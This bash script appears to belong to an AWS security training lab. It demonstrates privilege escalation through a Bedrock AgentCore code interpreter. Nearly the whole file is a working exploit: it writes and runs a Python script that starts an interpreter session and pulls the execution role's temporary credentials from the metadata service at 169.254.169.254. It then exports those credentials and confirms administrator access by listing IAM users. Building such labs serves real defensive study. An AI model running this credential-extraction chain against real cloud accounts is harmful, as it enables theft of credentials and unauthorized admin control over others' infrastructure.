#!/bin/bash

# Demo script for bedrockagentcore-startsession+invoke privilege escalation (bedrock-002)
# This scenario demonstrates how a principal with StartCodeInterpreterSession and
# InvokeCodeInterpreter can access an EXISTING code interpreter with a privileged
# role and extract credentials from the MicroVM Metadata Service (MMDS)


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-bedrock-002-to-admin-starting-user"
TARGET_ROLE="pl-prod-bedrock-002-to-admin-target-role"
PYTHON_SCRIPT="/tmp/bedrock_extract_credentials.py"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Bedrock AgentCore Code Interpreter Privilege Escalation Demo${NC}"
echo -e "${GREEN}Scenario: bedrockagentcore-startsession+invoke (bedrock-002)${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${BLUE}This scenario demonstrates accessing an EXISTING code interpreter${NC}"
echo -e "${BLUE}that has a privileged IAM role attached to extract credentials.${NC}"
echo -e "${BLUE}No iam:PassRole required - only StartSession + InvokeCodeInterpreter!${NC}\n"

# Step 1: Check prerequisites
echo -e "${YELLOW}Step 1: Checking prerequisites${NC}"
echo "Checking for required tools..."

# Check for jq
if ! command -v jq &> /dev/null; then
    echo -e "${RED}Error: jq is not installed${NC}"
    echo "Please install jq: https://stedolan.github.io/jq/download/"
    exit 1
fi
echo -e "${GREEN}✓ jq is installed${NC}"

# Check for python3
if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Error: python3 is not installed${NC}"
    echo "Please install python3"
    exit 1
fi
echo -e "${GREEN}✓ python3 is installed${NC}"

# Check for boto3
if ! python3 -c "import boto3" 2>/dev/null; then
    echo -e "${RED}Error: boto3 is not installed${NC}"
    echo "Please install boto3: pip3 install boto3"
    exit 1
fi
echo -e "${GREEN}✓ boto3 is installed${NC}"
echo ""

# Step 2: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 2: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_bedrock_002_bedrockagentcore_startsession_invoke.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials and interpreter ID from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
EXISTING_INTERPRETER_ID=$(echo "$MODULE_OUTPUT" | jq -r '.existing_interpreter_id')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$EXISTING_INTERPRETER_ID" == "null" ] || [ -z "$EXISTING_INTERPRETER_ID" ]; then
    echo -e "${RED}Error: Could not extract interpreter ID from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Existing interpreter ID: $EXISTING_INTERPRETER_ID"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 3: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 3: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 4: Get account ID
echo -e "${YELLOW}Step 4: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 5: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 6: Use the existing code interpreter from Terraform
echo -e "${YELLOW}Step 6: Using pre-deployed code interpreter${NC}"
echo "This scenario targets an EXISTING code interpreter deployed by Terraform"
echo "Target interpreter ID: $EXISTING_INTERPRETER_ID"

# Use the interpreter ID we got from Terraform
INTERPRETER_ID="$EXISTING_INTERPRETER_ID"
echo -e "${GREEN}✓ Using target code interpreter from Terraform${NC}\n"

# Step 7: Confirm the interpreter's execution role
echo -e "${YELLOW}Step 7: Confirming code interpreter configuration${NC}"
echo "The code interpreter was deployed by Terraform with the target admin role"
echo "Target role: $TARGET_ROLE"
echo -e "${GREEN}✓ Interpreter has privileged execution role attached${NC}\n"

# Step 8: Create Python script to extract credentials from MMDS
echo -e "${YELLOW}Step 8: Creating credential extraction script${NC}"
echo "Writing Python script to: $PYTHON_SCRIPT"

cat > $PYTHON_SCRIPT << 'PYTHON_SCRIPT_EOF'
#!/usr/bin/env python3
"""
Bedrock AgentCore Code Interpreter Credential Extraction

This script starts a session with an existing Bedrock code interpreter and
invokes Python code within the interpreter's MicroVM to extract temporary
credentials from the MicroVM Metadata Service (MMDS) at 169.254.169.254.

The code interpreter runs with the execution role's permissions, allowing
us to extract and use those elevated credentials.
"""

import boto3
import json
import sys

if len(sys.argv) < 3:
    print("Usage: python3 script.py <interpreter-id> <region>")
    sys.exit(1)

INTERPRETER_ID = sys.argv[1]
REGION = sys.argv[2]

print(f"[*] Connecting to Bedrock AgentCore in region: {REGION}")
bedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=REGION)

# Step 1: Start a code interpreter session
print(f"[*] Starting code interpreter session with: {INTERPRETER_ID}")
try:
    session = bedrock_agentcore_client.start_code_interpreter_session(
        codeInterpreterIdentifier=INTERPRETER_ID
    )
    session_id = session['sessionId']
    print(f"[+] Session started successfully: {session_id}")
except Exception as e:
    print(f"[-] Failed to start session: {e}")
    sys.exit(1)

# Step 2: Prepare code to extract credentials from MMDS
# The code interpreter runs in a MicroVM with access to metadata at 169.254.169.254
# We use IMDSv2 pattern for metadata access
extraction_code = '''
import urllib.request
import json

# IMDSv2 requires a token
token_url = "http://169.254.169.254/latest/api/token"
token_headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
token_request = urllib.request.Request(token_url, headers=token_headers, method='PUT')

try:
    with urllib.request.urlopen(token_request) as response:
        token = response.read().decode('utf-8')

    # Get the role name
    role_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    role_request = urllib.request.Request(role_url, headers={"X-aws-ec2-metadata-token": token})

    with urllib.request.urlopen(role_request) as response:
        role_name = response.read().decode('utf-8').strip()

    # Get the credentials
    creds_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
    creds_request = urllib.request.Request(creds_url, headers={"X-aws-ec2-metadata-token": token})

    with urllib.request.urlopen(creds_request) as response:
        credentials = response.read().decode('utf-8')

    print(credentials)
except Exception as e:
    print(f"Error: {str(e)}")
'''

# Step 3: Invoke the code interpreter with our extraction code
print("[*] Invoking code interpreter to extract credentials from MMDS...")
try:
    response = bedrock_agentcore_client.invoke_code_interpreter(
        codeInterpreterIdentifier=INTERPRETER_ID,
        sessionId=session_id,
        name='executeCode',
        arguments={'code': extraction_code, 'language': 'python'}
    )

    # Parse the streaming response
    print("[*] Processing response stream...")
    credentials_json = None

    for event in response['stream']:
        if 'result' in event:
            result = event['result']
            if 'structuredContent' in result and 'stdout' in result['structuredContent']:
                stdout = result['structuredContent']['stdout']
                if stdout and stdout.strip():
                    print("[+] Received credentials from MMDS!")
                    credentials_json = stdout.strip()
                    break

    if credentials_json:
        print("\n" + "="*60)
        print("EXTRACTED CREDENTIALS:")
        print("="*60)
        # Parse and pretty-print the credentials
        creds = json.loads(credentials_json)
        print(f"AccessKeyId: {creds.get('AccessKeyId', 'N/A')}")
        print(f"SecretAccessKey: {creds.get('SecretAccessKey', 'N/A')[:20]}...")
        print(f"Token: {creds.get('Token', 'N/A')[:50]}...")
        print(f"Expiration: {creds.get('Expiration', 'N/A')}")
        print("="*60 + "\n")

        # Output credentials in export format
        print("# Export these credentials to use them:")
        print(f"export AWS_ACCESS_KEY_ID='{creds['AccessKeyId']}'")
        print(f"export AWS_SECRET_ACCESS_KEY='{creds['SecretAccessKey']}'")
        print(f"export AWS_SESSION_TOKEN='{creds['Token']}'")
    else:
        print("[-] No credentials extracted")
        sys.exit(1)

except Exception as e:
    print(f"[-] Failed to invoke code interpreter: {e}")
    sys.exit(1)
PYTHON_SCRIPT_EOF

chmod +x $PYTHON_SCRIPT
echo -e "${GREEN}✓ Created credential extraction script${NC}\n"

# [EXPLOIT] Step 9: Execute the credential extraction
echo -e "${YELLOW}Step 9: Extracting credentials from code interpreter's MMDS${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Running Python script to extract credentials..."
echo ""

show_attack_cmd "Attacker" "python3 $PYTHON_SCRIPT $INTERPRETER_ID $AWS_REGION"
# Run the script and capture the output
SCRIPT_OUTPUT=$(python3 $PYTHON_SCRIPT $INTERPRETER_ID $AWS_REGION 2>&1)

# Display the output
echo "$SCRIPT_OUTPUT"
echo ""

# Extract the credentials from the output
EXTRACTED_ACCESS_KEY=$(echo "$SCRIPT_OUTPUT" | grep "export AWS_ACCESS_KEY_ID" | sed "s/.*='\(.*\)'/\1/")
EXTRACTED_SECRET_KEY=$(echo "$SCRIPT_OUTPUT" | grep "export AWS_SECRET_ACCESS_KEY" | sed "s/.*='\(.*\)'/\1/")
EXTRACTED_SESSION_TOKEN=$(echo "$SCRIPT_OUTPUT" | grep "export AWS_SESSION_TOKEN" | sed "s/.*='\(.*\)'/\1/")

if [ -z "$EXTRACTED_ACCESS_KEY" ] || [ -z "$EXTRACTED_SECRET_KEY" ] || [ -z "$EXTRACTED_SESSION_TOKEN" ]; then
    echo -e "${RED}Error: Failed to extract credentials${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Successfully extracted credentials from MMDS!${NC}\n"

# [EXPLOIT] Step 10: Use the extracted credentials
echo -e "${YELLOW}Step 10: Switching to extracted credentials${NC}"
# These are dynamically extracted role credentials from MMDS - not starting or readonly creds
export AWS_ACCESS_KEY_ID=$EXTRACTED_ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$EXTRACTED_SECRET_KEY
export AWS_SESSION_TOKEN=$EXTRACTED_SESSION_TOKEN
export AWS_REGION=$AWS_REGION

echo "Verifying identity with extracted credentials..."
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
ELEVATED_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ELEVATED_IDENTITY"

if [[ $ELEVATED_IDENTITY == *"$TARGET_ROLE"* ]]; then
    echo -e "${GREEN}✓ Successfully assumed the target role's identity!${NC}"
else
    echo -e "${YELLOW}Warning: Identity doesn't match expected target role${NC}"
fi
echo ""

# [OBSERVATION] Step 11: Verify administrator access
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
echo "Attempting to list IAM users with extracted credentials..."
echo ""

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo ""
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Discovered existing code interpreter: $INTERPRETER_ID"
echo "3. Verified interpreter uses privileged role: $TARGET_ROLE"
echo "4. Started code interpreter session"
echo "5. Invoked Python code in interpreter's MicroVM"
echo "6. Extracted credentials from MMDS at 169.254.169.254"
echo "7. Used extracted credentials to gain administrative access"
echo "8. Achieved: Full administrator permissions"

echo -e "\n${YELLOW}Key Points:${NC}"
echo "- No iam:PassRole required (interpreter already exists)"
echo "- Only needs: StartCodeInterpreterSession + InvokeCodeInterpreter"
echo "- Extracts temporary credentials from MicroVM metadata service"
echo "- Credentials have full permissions of the execution role"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER"
echo "  → StartCodeInterpreterSession"
echo "  → InvokeCodeInterpreter (extract MMDS credentials)"
echo "  → Admin Access via $TARGET_ROLE credentials"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Python script: $PYTHON_SCRIPT"
echo "- Active code interpreter session: $INTERPRETER_ID"
echo "- Extracted temporary credentials (will expire)"

echo -e "\n${RED}⚠ Warning: The extracted credentials are temporary and will expire${NC}"
echo -e "${RED}⚠ The code interpreter session remains active until cleaned up${NC}"

echo -e "\n${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
